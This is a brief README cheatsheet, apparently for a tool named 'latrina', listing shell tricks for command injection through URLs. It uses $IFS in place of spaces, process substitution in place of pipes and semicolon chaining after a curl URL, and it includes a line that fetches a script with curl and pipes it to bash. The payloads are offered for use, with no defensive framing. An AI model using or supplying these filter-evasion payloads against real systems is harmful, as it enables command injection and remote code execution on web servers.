# latrina
bypass url encoding for nontrivial shell commands

# cheatsheet  
### setting string variables without quotes    
`variable=('a')`  
### separating fields without spaces 
`echo$IFS$a`
### separating fields without spaces and curly brackets
`a=('a');echo$IFS$a` 
### piping without pipes  
`wc$IFS-l$IFS<$IFS<(ls)`     
### starting code execution in a url without ampersand
`curl http://localhost/;whoami`
### redirecting to a hidden exploit (localhost/bin/bash)
`curl -s http://localhost/$0 | bash`
